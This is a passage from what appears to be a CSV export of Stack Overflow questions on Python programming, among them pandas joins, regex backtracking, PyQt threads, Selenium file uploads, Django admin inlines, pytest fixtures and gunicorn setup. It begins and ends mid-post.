<p>Now I want to split my size sub columns from main columns and create only single size column but want to keep the sum columns under main column headings. I have tried different approaches but not successful.
These are the methods I have tried but unable to get things working for me:</p>

<p><a href=""http://stackoverflow.com/questions/19384532/how-to-count-number-of-rows-in-a-group-in-pandas-group-by-object"">How to count number of rows in a group in pandas group by object?</a></p>

<p><a href=""http://stackoverflow.com/questions/10373660/converting-a-pandas-groupby-object-to-dataframe"">Converting a Pandas GroupBy object to DataFrame</a></p>

<p>Will be grateful to if anyone can help me with this one.</p>

<p>Regards,</p>
"
39990657,610569.0,2016-10-12 04:42:41+00:00,3,Regex match (\w+) to capture single words delimited by ||| - Python,"<p>I am trying to match if there's singe word followed by <code>\s|||\s</code> and then another single word followed by <code>\s|||\s</code> so I'm using this regex:</p>

<pre><code>single_word_regex = r'(\w+)+\s\|\|\|\s(\w+)\s\|\|\|\s.*'
</code></pre>

<p>And when I tried to match this string, the regex matching hangs or take minutes (possibly going into some sort of ""deep loop"")</p>

<pre><code>&gt;&gt;&gt; import re
&gt;&gt;&gt; import time
&gt;&gt;&gt; single_word_regex = r'(\w+)+\s\|\|\|\s(\w+)\s\|\|\|\s.*'        
&gt;&gt;&gt; x = u'amornratchatchawansawangwong ||| amornratchatchawansawangwong . ||| 0.594819 0.5 0.594819 0.25 ||| 0-0 0-1 ||| 1 1 1 ||| |||'
&gt;&gt;&gt; z = u'amor æ ||| amor . i ||| 0.594819 0.0585231 0.594819 0.0489472 ||| 0-0 0-1 1-2 ||| 2 2 2 ||| |||'
&gt;&gt;&gt; y = u'amor ||| amor ||| 0.396546 0.0833347 0.29741 0.08 ||| 0-0 0-1 ||| 3 4 2 ||| |||'
&gt;&gt;&gt; re.match(single_word_regex, z, re.U)                                              
&gt;&gt;&gt; re.match(single_word_regex, y, re.U)                                          
&lt;_sre.SRE_Match object at 0x105b879c0&gt;
&gt;&gt;&gt; start = time.time(); re.match(single_word_regex, y, re.U); print time.time() - start
9.60826873779e-05
&gt;&gt;&gt; start = time.time(); re.match(single_word_regex, x, re.U); print time.time() - start # It hangs...
</code></pre>

<p><strong>Why is it taking that long?</strong></p>

<p>Is there a better/simpler regex to capture this condition<code>len(x.split(' ||| ')[0].split()) == 1 == len(x.split(' ||| ').split())</code>?</p>
"
39604903,6534415.0,2016-09-20 22:49:30+00:00,3,Qthread is still working when i close gui on python pyqt,"<p>my code has thread, but when i close the gui, it still works on background. how can i stop threads? is there something stop(), close()?
i dont use signal, slots? Must i use this?</p>

<pre><code>from PyQt4 import QtGui, QtCore
import sys
import time
import threading

class Main(QtGui.QMainWindow):
    def __init__(self, parent=None):
        super(Main, self).__init__(parent)
        self.kac_ders=QtGui.QComboBox()
        self.bilgi_cek=QtGui.QPushButton(""Save"")
        self.text=QtGui.QLineEdit()
        self.widgetlayout=QtGui.QFormLayout()
        self.widgetlar=QtGui.QWidget()
        self.widgetlar.setLayout(self.widgetlayout)
        self.bilgiler=QtGui.QTextBrowser()
        self.bilgi_cek.clicked.connect(self.on_testLoop)
        self.scrollArea = QtGui.QScrollArea()
        self.scrollArea.setWidgetResizable(True)
        self.scrollArea.setWidget(self.widgetlar)
        self.analayout=QtGui.QVBoxLayout()
        self.analayout.addWidget(self.text)
        self.analayout.addWidget(self.bilgi_cek)
        self.analayout.addWidget(self.bilgiler)
        self.centralWidget=QtGui.QWidget()
        self.centralWidget.setLayout(self.analayout)
        self.setCentralWidget(self.centralWidget)

    def on_testLoop(self):
        self.c_thread=threading.Thread(target=self.kontenjan_ara)
        self.c_thread.start()

    def kontenjan_ara(self):

        while(1):
                self.bilgiler.append(self.text.text())
                time.sleep(10)


app = QtGui.QApplication(sys.argv)
myWidget = Main()
myWidget.show()
app.exec_()
</code></pre>
"
40040564,3745794.0,2016-10-14 10:10:34+00:00,3,Automating file upload using Selenium and pywinauto,"<p>I am trying to automate a file uplad in a form. The form works as follows:
- some data insert
- click on add attachment button
- windows dialogue window appears
- select the file
- open it</p>

<p><strong>I am using python, Selenium webdriver and pywinauto module.</strong></p>

<p>Similar approach was described <a href=""http://stackoverflow.com/questions/21236183/upload-a-file-using-webdriver-pywinauto"">here</a> but it only deals with file name and not with path to it.</p>

<p>Sending keys to the element with Selenium is not possible because there is no textbox that would contain the path. I have tried using AutoIT with the followin code:</p>

<pre><code>$hWnd = WinWaitActive(""[REGEXPTITLE:Otev.*|Op.*)]"")

If WinGetTitle($hWnd) = ""Open"" then
    Send("".\Gandalf"")
    Send(""{ENTER}"")
Else
    Send("".\Gandalf"")
    Send(""{ENTER}"")
EndIf
</code></pre>

<p>The code basically waits for window with title Open or Otevrit (in CZ) to appear and then do the magic. This code is compiled into an .exe and ran at appropriate moment.</p>

<p>The code works fine and does the upload, but I <strong>can not alter the path to file</strong>. This is neccessary if I want run my code on any computer. The mobility of the code is neccessary because it is a part of a desktop application for running Selenium tests. </p>

<p>The window which I am trying to handle is:</p>

<p><a href=""https://i.stack.imgur.com/GHmcW.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/GHmcW.png"" alt=""enter image description here""></a></p>

<p>Basically I would like to input my path string and open the file location. After that I would input the file name and open it (perform the upload). Currently my code looks like:</p>

<pre><code>    # click on upload file button:
    WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, ""//*[@class=\""qq-upload-   button-selector qq-upload-button\""]""))).click()
    # wait two seconds for dialog to appear:
    time.sleep(2)
    # start the upload
    dialogWindow = pywinauto.application.Application()
    windowHandle = pywinauto.findwindows.find_windows(title=u'Open', class_name='#32770')[0]
    window = dialogWindow.window_(handle=windowHandle)
    # this is the element that I would like to access (not sure)
    toolbar = window.Children()[41]
    # send keys:
    toolbar.TypeKeys(""path/to/the/folder/"")
    # insert file name:
    window.Edit.SetText(""Gandalf.jpg"")
    # click on open:
    window[""Open""].Click()
</code></pre>

<p>I am not sure where my problem is. Input the file name is no problem and I can do it with:</p>

<pre><code>window.Edit.SetText(""Gandalf.jpg"")
</code></pre>

<p>But For some reason I can't do the same with the path element. <strong>I have tried setting focus on it and clicking</strong> but the code fails.</p>

<p>Thank you for help.</p>

<p><strong>BUTTON HTML:</strong></p>

<pre><code>&lt;div class=""qq-upload-button-selector qq-upload-button"" style=""position: relative; overflow: hidden; direction: ltr;""&gt;
        &lt;div&gt;UPLOAD FILE&lt;/div&gt;
    &lt;input qq-button-id=""8032e5d2-0f73-4b7b-b64a-e125fd2a9aaf"" type=""file"" name=""qqfile"" style=""position: absolute; right: 0px; top: 0px; font-family: Arial; font-size: 118px; margin: 0px; padding: 0px; cursor: pointer; opacity: 0; height: 100%;""&gt;&lt;/div&gt;
</code></pre>
"
39993744,6414357.0,2016-10-12 08:19:08+00:00,3,How to create list of 3 or 4 columns of Dataframe in Pandas when we have 20 to 50 colums?,"<p>When we create list using the below code, we get the list of all the columns but I want to get the list of only 3 to 5 specific columns.</p>

<p>col_list= list(df)</p>
"
39730037,4807043.0,2016-09-27 16:39:21+00:00,3,how to trigger function in another object when variable changed. Python,"<p>As far as I know, this is like an Observer pattern. 
Scenario: <strong>A Center object keeps a list (queue) of all its clients.</strong> I'm using Twisted.</p>

<ol>
<li>One of client objects <strong>changes a variable</strong> in center object OR notify the center to change the variable, </li>
<li>and then the center object <strong>detects the change</strong> immediately; </li>
<li>then as soon as the detection, the center object invoke some function <strong>of next object</strong> in queue</li>
<li>After the client changed the variable, <strong>the client object will be <em>eliminated.</em></strong> The center will take care of next client object. So I imagine there's no any function chain between these objects. So it's a little bit different from observer pattern.  (How to address this issue? Correct me if I'm wrong.)</li>
</ol>

<p>following code is just for demo only:</p>

<pre><code>    class client():
        def change(self):
            self.center.va = 1

        def inqueue(self):
            self.center.queue.enqueue(self)

        def function(self):
            pass

    class center():
        def __init__(self):
            self.queue = None
            self.va = 0

        ####  When the self.va changes, this func will be invoked
        def whenChanged(self):
            next = self.queue.dequeue()
            next.function()
</code></pre>
"
40121871,2336654.0,2016-10-19 03:59:56+00:00,3,how can I test for ordered subset,"<p><strong><em>firstly</em></strong><br>
I need to be able to test that <code>'abc'</code> is an ordered subset of <code>'axbyc'</code> and <code>'egd'</code> is not an ordered subset of <code>'edg'</code>.  Another way to say it is that it is an ordered subset if I can remove specific characters of of one string and have it be equal to another.</p>

<p><strong><em>secondly</em></strong><br>
I need to compare one <code>pd.Series</code> with another <code>pd.Series</code> to determine if the elements of one are ordered subsets of the corresponding element of the other.</p>

<p>consider the <code>pd.Series</code> <code>s1</code> and <code>s2</code></p>

<pre><code>s1 = pd.Series(['abc', 'egd'])
s2 = pd.Series(['axbyc', 'edg'])
</code></pre>

<p>I need to compare them such that the results of the question<br>
Are the elements of <code>s1</code> ordered subsets of <code>s2</code> equals</p>

<pre><code>0     True
1    False
dtype: bool
</code></pre>
"
40040250,4378721.0,2016-10-14 09:55:07+00:00,3,Django : Edit the many to many field Inline using Django Admin,"<p>I want to edit the cuisines associated with a dish on the dish panel in django admin. I am trying to use <strong>InlineModelAdmin</strong>. The problem is that I can edit the DishCuisinesMap objects but not the cuisines object.
Here is the <strong>screenshot</strong>:</p>

<p><a href=""https://i.stack.imgur.com/rZYXN.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/rZYXN.png"" alt=""screenshot""></a></p>

<p>This is my models.py:</p>

<pre><code>class Cuisines(models.Model):
    cuisine_id = models.IntegerField(primary_key=True)
    cuisine_mtom = models.ManyToManyField('DishInfo', through='DishCuisinesMap')
    name = models.TextField()
    cuisine_sf_name = models.TextField() 
    type = models.IntegerField()
    insert_time = models.DateTimeField()
    update_time = models.DateTimeField()

    class Meta:
        managed = False
        db_table = 'cuisines'

class DishCuisinesMap(models.Model):
    dish = models.ForeignKey('DishInfo', on_delete=models.PROTECT,
                             related_name='dcm_dish')
    cuisine = models.ForeignKey(Cuisines, on_delete=models.PROTECT,
                                related_name='dcm_cuisine')
    insert_time = models.DateTimeField()
    update_time = models.DateTimeField()

    class Meta:
        managed = False
        db_table = 'dish_cuisines_map'
        unique_together = (('dish', 'cuisine'),)


class DishInfo(models.Model):
    dish_id = models.BigIntegerField(primary_key=True)
    bid = models.ForeignKey(Brands, on_delete=models.PROTECT, db_column='bid',
                            related_name='dinfo_brand')
    name = models.TextField()
    is_live = models.IntegerField()
    veg_nonveg_ind = models.SmallIntegerField(blank=True, null=True)
    sf_name = models.TextField()
    descr = models.TextField(blank=True, null=True)
    expert_tag = models.TextField(blank=True, null=True)
    special_desc = models.TextField(blank=True, null=True)
    reco_percent = models.IntegerField(blank=True, null=True)
    one_liner = models.TextField(blank=True, null=True)
    nutrition = JSONField() 
    insert_time = models.DateTimeField()
    update_time = models.DateTimeField()
    images = ArrayField(models.TextField()) 

    class Meta:
        managed = False
        db_table = 'dish_info'
        unique_together = (('bid', 'name'), ('bid', 'sf_name'),)

    def __unicode__(self):
        brand_name = self.bid.name
        return self.name
</code></pre>

<p>and this is my admin.py:</p>

<pre><code>class CityDishFilter(admin.SimpleListFilter):
    title = ('city name')
    parameter_name = 'city_id'

    def lookups(self, request, model_admin):
        list_of_cities = list()
        queryset = Cities.objects.all()
        for city in queryset:
            list_of_cities.append(
                    (str(city.city_id), city.name)
                )
        return list_of_cities

    def queryset(self, request, queryset):
        query_params = request.GET  
        if self.value():
            city_query = DelLocations.objects.filter(city__city_id=self.value())\
                                                                        .values('del_id')
            loc_query = DelLocationsMapping.objects.filter(del_loc__in=
                                                        city_query).values('plot')
            dopm_query = DishOutletPlatMapping.objects.filter(plot__in
                                                        =loc_query).values('dish')
            final_query = DishInfo.objects.filter(dish_id__in=dopm_query)
            if 'veg_nonveg_ind' in query_params:
                final_query = final_query.filter(veg_nonveg_ind=query_params.get('veg_nonveg_ind'))

            if 'is_live' in query_params:
                final_query = final_query.filter(is_live=query_params.get('is_live'))
            return final_query
        return queryset


class BrandDishFilter(admin.SimpleListFilter):
    title = ('brand name')
    parameter_name = 'brand_id'

    def lookups(self, request, model_admin):
        query_params = request.GET
        list_of_brands = list()
        if 'city_id' in query_params:
            city_query = DelLocations.objects.filter(city__city_id=query_params.get('city_id'))\
                                                                        .values('del_id')
            loc_query = DelLocationsMapping.objects.filter(del_loc__in=
                                                        city_query).values('plot')
            dopm_query = DishOutletPlatMapping.objects.filter(plot__in
                                                        =loc_query).values('dish')
            dish_query = DishInfo.objects.filter(dish_id__in=dopm_query).\
                                                            values('bid').distinct()
            brand_query = Brands.objects.filter(bid__in=dish_query).order_by('name')
            for brand in brand_query:
                list_of_brands.append(
                        (str(brand.bid), brand.name)
                    )
            return list_of_brands
        else:
            brand_query = Brands.objects.all().order_by('name')
            for brand in brand_query:
                list_of_brands.append(
                        (str(brand.bid), brand.name)
                    )
            return list_of_brands

    def queryset(self, request, queryset):
        if 'brand_id' in request.GET:
            queryset = queryset.filter(bid=self.value())
            return queryset
        return queryset

class DishCuisinesInline(admin.TabularInline):
    model = DishCuisinesMap
    extra = 1

class CuisinesAdmin(admin.ModelAdmin):
    inlines = [DishCuisinesInline,]
    fields = (""name"", ""cuisine_sf_name"", ""type"")

class DishInfoAdmin(admin.ModelAdmin):
    list_select_related = ('bid',)
    list_display = ('name', 'brand_name')
    fieldsets = (
                    (None, {'fields': ('name', 'sf_name', 'is_live', 'veg_nonveg_ind',
                                        'one_liner',
                                      )
                            }
                    ),
                    ('Advanced options', {'classes': ('collapse',),
                                           'fields': ('descr', 'images')
                                         }
                    )
                )
    search_fields = ['name', 'bid__name']
    list_filter = ('veg_nonveg_ind', 'is_live', CityDishFilter, BrandDishFilter) #, 'bid__name'
    inlines = [DishTimingsInline, DishCuisinesInline]

    # changing the size of the text fields:
    formfield_overrides = {
    models.TextField: {'widget': Textarea(
                       attrs = {'rows': 4,
                              'cols': 50})
                        },
                    }


    def brand_name(self, obj):
        return obj.bid.name


admin.site.register(DishInfo, DishInfoAdmin)
admin.site.register(Cuisines, CuisinesAdmin)
</code></pre>

<p>The django docs <a href=""https://docs.djangoproject.com/en/1.10/ref/contrib/admin/#django.contrib.admin.ModelAdmin.formfield_for_foreignkey"" rel=""nofollow"">here</a> say that membership objects can be edited from Person or the Group detail pages, but what is way to edit the group from the person details page?
In my case I need a way to edit the cuisines from the dish page , I am pretty new to django. Any help is greatly appreciated.</p>
"
39993507,3063935.0,2016-10-12 08:03:02+00:00,3,How do I memoize this LIS python2.7 algorithm properly?,"<p>I'm practicing Dynamic Programming and I am writing the Longest Increasing Subsequence problem.</p>

<p>I have the DP solution:</p>

<pre><code>def longest_subsequence(lst, lis=[], mem={}):
  if not lst:
    return lis
  if tuple(lst) not in mem.keys():
    if not lis or lst[0] &gt; lis[-1]:
      mem[tuple(lst)] = max([longest_subsequence(lst[1:], lis+[lst[0]], mem), longest_subsequence(lst[1:], lis, mem)], key=len)
    else:
     mem[tuple(lst)] = longest_subsequence(lst[1:], lis, mem)
  return mem[tuple(lst)]
</code></pre>

<p>And a non-memoized version</p>

<pre><code>def longest_subsequence(lst, lis=[]):
  if not lst:
    return lis
  if not lis or lst[0] &gt; lis[-1]:
    result = max([longest_subsequence(lst[1:], lis+[lst[0]]), longest_subsequence(lst[1:], lis)], key=len)
  else:
    result = longest_subsequence(lst[1:], lis)
  return result
</code></pre>

<p>However, the two functions have different behaviours. For example, the test case <code>longest_subsequence([10,9,2,5,3,7,101,18])</code> fails for the memoized version. </p>

<pre><code>&gt;&gt;&gt; longest_subsequence([10,9,2,5,3,7,101,18])
[10, 101]
</code></pre>

<p>The non-memoized version is fully correct however (although much slower). </p>

<pre><code>&gt;&gt;&gt; longest_subsequence([10,9,2,5,3,7,101,18])
[2, 5, 7, 101]
</code></pre>

<p>what I am doing wrong?</p>

<p><strong>EDIT:</strong> Tempux's answer fails on the following:</p>

<pre><code>&gt;&gt;&gt; longest_subsequence([3,5,6,2,5,4,19,5,6,7,12])
[3, 5, 6, 7, 12]
</code></pre>

<p>where the solution the non-memoized version is:</p>

<pre><code>&gt;&gt;&gt; longest_subsequence([3,5,6,2,5,4,19,5,6,7,12])
[3, 4, 5, 6, 7, 12]
</code></pre>
"
39627188,512111.0,2016-09-21 21:55:36+00:00,3,Concurrent download and processing of large files in python,"<p>I have a list of URLs for large files to <strong>download</strong> (e.g. compressed archives), which I want to <strong>process</strong> (e.g. decompress the archives). </p>

<p>Both download and processing take a long time and processing is heavy on disk IO, so I want to have <strong>just one of each to run at a time</strong>. Since the two tasks take about the same time and do not compete for the same resources, I want to download the next file(s) while the last is being processed.</p>

<p>This is a variation of the <strong><a href=""https://en.wikipedia.org/wiki/Producer%E2%80%93consumer_problem"" rel=""nofollow"">producer-consumer problem</a></strong>.</p>

<p>The situation is similar to <a href=""http://stackoverflow.com/q/12474182/512111"">reading and processing images</a> or <a href=""http://stackoverflow.com/questions/37825218/fastest-way-to-read-and-process-100-000-urls-in-python"">downloading loads of files</a>, but my downloader calls are not (yet) picklable, so I have not been able to use multiprocessing, and both tasks take about the same time.</p>

<p>Here is a dummy example, where both download and processing are blocking:</p>

<pre><code>import time
import posixpath

def download(urls):
    for url in urls:
        time.sleep(3)  # this is the download (more like 1000s) 
        yield posixpath.basename(url)

def process(fname):
    time.sleep(2)  # this is the processing part (more like 600s)

urls = ['a', 'b', 'c']
for fname in download(urls):
    process(fname)
    print(fname)
</code></pre>

<p>How could I make the two tasks concurrent? Can I use <code>yield</code> or <code>yield from</code> <a href=""http://stackoverflow.com/questions/9708902/in-practice-what-are-the-main-uses-for-the-new-yield-from-syntax-in-python-3"">in a smart way</a>, perhaps in combination with <a href=""https://docs.python.org/2/library/collections.html#collections.deque"" rel=""nofollow""><code>deque</code></a>? Or must it be <a href=""https://docs.python.org/3.4/library/asyncio.html"" rel=""nofollow""><code>asyncio</code></a> with <code>Future</code>?</p>
"
39612300,2756793.0,2016-09-21 09:16:03+00:00,3,Pandas: Change values chosen by boolean indexing in a column without getting a warning,"<p>I have a dataframe, I want to change only those values of a column where another column fulfills a certain condition. I'm trying to do this with <code>iloc</code> at the moment and it either does not work or I'm getting that annoying warning:</p>

<blockquote>
  <p>A value is trying to be set on a copy of a slice from a DataFrame</p>
</blockquote>

<p>Example:</p>

<pre><code>import pandas as pd
DF = pd.DataFrame({'A':[1,1,2,1,2,2,1,2,1],'B':['a','a','b','c','x','t','i','x','b']})
</code></pre>

<p>Doing one of those</p>

<pre><code>DF['B'].iloc[:][DF['A'] == 1] = 'X'

DF.iloc[:]['B'][DF['A'] == 1] = 'Y'
</code></pre>

<p>works, but leads to the warning above.</p>

<p>This one also gives a warning, but does not work:</p>

<pre><code>DF.iloc[:][DF['A'] == 1]['B'] = 'Z'
</code></pre>

<p>I'm really confused about how to do boolean indexing using <code>loc</code>, <code>iloc</code>, and <code>ix</code> right, that is, how to provide row index, column index, AND boolean index in the right order and with the correct syntax. </p>

<p>Can someone clear this up for me?</p>
"
39729558,229181.0,2016-09-27 16:12:05+00:00,3,pytest parameterized session fixtures execute too many times,"<p>Consider the following test code, which compares a mock run result with an expected result. The value of the run result depends on a value of a parameterized fixture paramfixture, which provides two values, so there are two possible variants of the run result. Since they are all session fixtures we should expect the run_result fixture execute only two times.</p>

<p>Now, please take a look at the test case test_run_result, which receives the run_result and expected_result fixtures to compare, and also receives the tolerance fixture, which is parameterized with two values. The test case checks if the difference between expected and resulted falls within the tolerance. Note that the run does not depend on the tolerance.</p>

<p>For some reason, which I donât understand Pytest executes the run_result() fixture three times. Can you explain why? </p>

<p>This was tested using pytest vers. 2.9.1</p>

<p>By the way, the run_result fixture would execute only two times if the test case weren't parameterized or were parameterized using a decoractor instead of a fixture i.e.: @pytest.mark.parametrize('tolerance', [1e-8, 1e-11]).</p>

<pre><code>import pytest

runcounter = 0

@pytest.fixture(scope=""session"", params=[1e-8, 1e-11])
def tolerance(request):
    """"""Precision in floating point compare.""""""
    return request.param

@pytest.fixture(scope='session', params=[1, 2])
def paramfixture(request):
    return request.param

@pytest.fixture(scope=""session"")
def expected_result(paramfixture):
    return 1 + paramfixture

@pytest.fixture(scope='session')
def run_result(paramfixture):
    global runcounter
    runcounter = runcounter + 1
    print ""Run #"", runcounter, 'param:', paramfixture
    return 1 + paramfixture

def test_run_result(run_result, expected_result, tolerance):
    print ""run_result: %d, expected_result: %d"" % (run_result, expected_result)
    assert abs(run_result - expected_result) &lt; tolerance
</code></pre>

<p>Pytest screenshot:</p>

<pre><code>$ py.test -vs test/end2end/test_temp.py
===================================================== test session starts ======================================================
platform linux2 -- Python 2.7.11, pytest-2.9.1, py-1.4.31, pluggy-0.3.1 -- /home/f557010/.conda/envs/sfpdev/bin/python
cachedir: .cache
rootdir: /home/f557010/svndev/SFP, inifile: pytest.ini
collected 4 items

test/end2end/test_temp.py::test_run_result[1e-08-1] Run # 1 param: 1
run_result: 2, expected_result: 2
PASSED
test/end2end/test_temp.py::test_run_result[1e-08-2] Run # 2 param: 2
run_result: 3, expected_result: 3
PASSED
test/end2end/test_temp.py::test_run_result[1e-11-2] 
run_result: 3, expected_result: 3
PASSED
test/end2end/test_temp.py::test_run_result[1e-11-1] Run # 3 param: 1
run_result: 2, expected_result: 2
PASSED

=================================================== 4 passed in 0.01 seconds ===================================================
</code></pre>
"
40040453,7017999.0,2016-10-14 10:05:02+00:00,3,Using Python to create a (random) sample of n words from text files,"<p>For my PhD project I am evaluating all existing Named Entity Recogition Taggers for Dutch. In order to check the precision and recall for those taggers I want to manually annotate all Named Entities in a random sample from my corpus. That manually annotated sample will function as the 'gold standard' to which I will compare the results of the different taggers. </p>

<p>My corpus consists of 170 Dutch novels. I am writing a Python script to generate a random sample of a specific amount of words for each novel (which I will use to annotate afterwards). All novels will be stored in the same directory. The following script is meant to generate for each novel in that directory a random sample of n-lines:</p>

<pre><code>import random
import os
import glob
import sys
import errno

path = '/Users/roelsmeets/Desktop/libris_corpus_clean/*.txt'
files = glob.glob(path)  

for text in files:
    try:
        with open(text, 'rt', encoding='utf-8') as f:
             # number of lines from txt file
             random_sample_input = random.sample(f.readlines(),100) 

    except IOError as exc:
    # Do not fail if a directory is found, just ignore it.
        if exc.errno != errno.EISDIR: 
            raise 


# This block of code writes the result of the previous to a new file
random_sample_output = open(""randomsample"", ""w"", encoding='utf-8') 
random_sample_input = map(lambda x: x+""\n"", random_sample_input)
random_sample_output.writelines(random_sample_input)
random_sample_output.close()
</code></pre>

<p>There are two problems with this code:</p>

<ol>
<li><p>Currently, I have put two novels (.txt files) in the directory. But the code only outputs a random sample for one of each novels. </p></li>
<li><p>Currently, the code samples a random amount of LINES from each .txt file, but I prefer to generate a random amount of WORDS for each .txt file. Ideally, I would like to generate a sample of, say, the first or last 100 words of each of the 170 .txt-files. In that case, the sample won't be random at all; but thus far, I couldn't find a way to create a sample without using the random library.</p></li>
</ol>

<p>Could anyone give a suggestion how to solve both problems? I am still new to Python and programming in general (I am a literary scholar), so I would be pleased to learn different approaches. Many thanks in advance!</p>
"
40122713,2225190.0,2016-10-19 05:17:11+00:00,3,How to know which is more advatageous with assigning same value to different attributes in python,"<p>Between the two in python which will be faster and advatageous</p>

<pre><code>a = b = c = d = 1
</code></pre>

<p>and</p>

<pre><code>a = 1
b = 1
c = 1
d = 1
</code></pre>
"
39751636,559827.0,2016-09-28 15:22:55+00:00,3,On the default/fill value for *multi-key* outer joins,"<p>NB: The post below is the ""multi-key"" counterpart of an <a href=""http://stackoverflow.com/q/39748976/559827"">earlier question</a> of mine.  The solutions to that earlier question work only for the case where the join is on a single key, and it is not clear to me how to generalize those solutions to the multi-key case presented below.  Since, IME, modifying an already-answered question in a way that disqualifies the answers it has received is frowned upon in SO, I'm posting this variant separately.  I have also posted a <a href=""http://meta.stackoverflow.com/q/335424/559827"">question</a> to Meta SO on whether I should delete this post and instead modify the original question, at the expense of invalidating its current answers.</p>

<hr>

<p>Below are teeny/toy versions of much larger/complex dataframes I'm working with:</p>

<pre><code>&gt;&gt;&gt; A
  key1 key2         u         v         w         x
0    a    G  0.757954  0.258917  0.404934  0.303313
1    b    H  0.583382  0.504687       NaN  0.618369
2    c    I       NaN  0.982785  0.902166       NaN
3    d    J  0.898838  0.472143       NaN  0.610887
4    e    K  0.966606  0.865310       NaN  0.548699
5    f    L       NaN  0.398824  0.668153       NaN

  key1 key2         y         z
0    a    G  0.867603       NaN
1    b    H       NaN  0.191067
2    c    I  0.238616  0.803179
3    d    G  0.080446       NaN
4    e    H  0.932834       NaN
5    f    I  0.706561  0.814467
</code></pre>

<p>(FWIW, at the end of this post, I provide code to generate these dataframes.)</p>

<p>I want to produce an outer join of these dataframes on the <code>key1</code> and <code>key2</code> columns, in such a way that the new positions induced by the outer join get default value 0.0.  IOW, the desired result looks like this</p>

<pre><code>  key1 key2         u         v         w         x          y         z
0    a    G  0.757954  0.258917  0.404934  0.303313   0.867603       NaN
1    b    H  0.583382  0.504687       NaN  0.618369        NaN  0.191067
2    c    I       NaN  0.982785  0.902166       NaN   0.238616  0.803179
3    d    J  0.898838  0.472143       NaN  0.610887   0.000000  0.000000
4    e    K  0.966606   0.86531       NaN  0.548699   0.000000  0.000000
5    f    L       NaN  0.398824  0.668153       NaN   0.000000  0.000000
6    d    G  0.000000  0.000000  0.000000  0.000000   0.080446       NaN
7    e    H  0.000000  0.000000  0.000000  0.000000   0.932834       NaN
8    f    I  0.000000  0.000000  0.000000  0.000000   0.706561  0.814467
</code></pre>

<p>(Note that this desired output contains some NaNs, namely those that were already present in <code>A</code> or <code>B</code>.)</p>

<p>The <code>merge</code> method gets me part-way there, but the filled-in default values are NaN's, not 0.0's:</p>

<pre><code>&gt;&gt;&gt; C = pandas.DataFrame.merge(A, B, how='outer', on=('key1', 'key2'))
&gt;&gt;&gt; C
  key1 key2         u         v         w         x         y         z
0    a    G  0.757954  0.258917  0.404934  0.303313  0.867603       NaN
1    b    H  0.583382  0.504687       NaN  0.618369       NaN  0.191067
2    c    I       NaN  0.982785  0.902166       NaN  0.238616  0.803179
3    d    J  0.898838  0.472143       NaN  0.610887       NaN       NaN
4    e    K  0.966606  0.865310       NaN  0.548699       NaN       NaN
5    f    L       NaN  0.398824  0.668153       NaN       NaN       NaN
6    d    G       NaN       NaN       NaN       NaN  0.080446       NaN
7    e    H       NaN       NaN       NaN       NaN  0.932834       NaN
8    f    I       NaN       NaN       NaN       NaN  0.706561  0.814467
</code></pre>

<p>The <code>fillna</code> method fails to produce the desired output, because it modifies some positions that should be left unchanged:</p>

<pre><code>&gt;&gt;&gt; C.fillna(0.0)
  key1 key2         u         v         w         x         y         z
0    a    G  0.757954  0.258917  0.404934  0.303313  0.867603  0.000000
1    b    H  0.583382  0.504687  0.000000  0.618369  0.000000  0.191067
2    c    I  0.000000  0.982785  0.902166  0.000000  0.238616  0.803179
3    d    J  0.898838  0.472143  0.000000  0.610887  0.000000  0.000000
4    e    K  0.966606  0.865310  0.000000  0.548699  0.000000  0.000000
5    f    L  0.000000  0.398824  0.668153  0.000000  0.000000  0.000000
6    d    G  0.000000  0.000000  0.000000  0.000000  0.080446  0.000000
7    e    H  0.000000  0.000000  0.000000  0.000000  0.932834  0.000000
8    f    I  0.000000  0.000000  0.000000  0.000000  0.706561  0.814467
</code></pre>

<p>How can I achieve the desired output efficiently?  (Performance matters here, because I intend to perform this operation on much larger dataframes than those shown here.)</p>

<hr>

<p><strong>IMPORTANT:</strong> In order to keep the example minimal, I made the multikey consist of only two columns; in practice the number of keys in a multi-key may be significantly greater.  Proposed answers should be suitable for multi-keys consisting of at least half-dozen columns.</p>

<hr>

<p>FWIW, below is the code to generate the example dataframes <code>A</code> and <code>B</code>.</p>

<pre><code>from pandas import DataFrame
from collections import OrderedDict
from random import random, seed

def make_dataframe(rows, colnames):
    return DataFrame(OrderedDict([(n, [row[i] for row in rows])
                                 for i, n in enumerate(colnames)]))

maybe_nan = lambda: float('nan') if random() &lt; 0.4 else random()

seed(0)

A = make_dataframe([['A', 'g', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['B', 'h', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['C', 'i', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['D', 'j', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['E', 'k', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()],
                    ['F', 'l', maybe_nan(), maybe_nan(), maybe_nan(), maybe_nan()]],
                   ('key1', 'key2', 'u', 'v', 'w', 'x'))

B = make_dataframe([['A', 'g', maybe_nan(), maybe_nan()],
                    ['B', 'h', maybe_nan(), maybe_nan()],
                    ['C', 'i', maybe_nan(), maybe_nan()],
                    ['D', 'g', maybe_nan(), maybe_nan()],
                    ['E', 'h', maybe_nan(), maybe_nan()],
                    ['F', 'i', maybe_nan(), maybe_nan()]],
                   ('key1', 'key2', 'y', 'z'))
</code></pre>
"
39990844,6402238.0,2016-10-12 05:02:48+00:00,3,"gunicorn ""configuration cannot be imported""","<p>I'm migrating a project that has been on Heroku to a DO droplet. Install went smoothly, and everything is working well when I <code>python manage.py runserver 0.0.0.0:8000</code>.</p>

<p>I'm now setting up gunicorn using these instructions:
<a href=""https://www.digitalocean.com/community/tutorials/how-to-set-up-django-with-postgres-nginx-and-gunicorn-on-ubuntu-14-04"" rel=""nofollow"">https://www.digitalocean.com/community/tutorials/how-to-set-up-django-with-postgres-nginx-and-gunicorn-on-ubuntu-14-04</a></p>

<p>I activate the virtual environment, and then try <code>--bind 0.0.0.0:3666 myproject.wsgi:application</code>. I get the following error:</p>

<pre><code>Traceback (most recent call last):
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/arbiter.py"", line 515, in spawn_worker
    worker.init_process()
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/workers/base.py"", line 122, in init_process
    self.load_wsgi()
